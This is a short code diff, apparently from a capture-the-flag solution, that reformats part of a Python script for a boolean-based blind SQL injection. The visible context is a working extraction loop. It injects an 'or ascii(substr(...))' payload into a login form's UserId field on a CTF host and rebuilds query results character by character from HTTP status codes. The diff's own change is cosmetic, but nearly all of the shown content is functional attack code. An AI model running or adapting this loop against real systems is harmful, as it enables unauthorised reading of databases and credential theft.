@@ -5,11 +5,7 @@ def data(sql):
     for i in range(1, 50):
         for ascii_code in range(32, 127):
             payload = f"normaltic' or ascii(substr(({sql}),{i},1))={ascii_code} and '1'='1"
-            data = {
-                "UserId": payload,
-                "Password": "1234",
-                "Submit": "Login"
-            }
+            data = {"UserId": payload, "Password": "1234", "Submit": "Login"}
             r = requests.post("http://ctf2.segfaulthub.com:7777/sqli_3/login.php", data=data, allow_redirects=False)
             if r.status_code == 200:
                 result += chr(ascii_code)
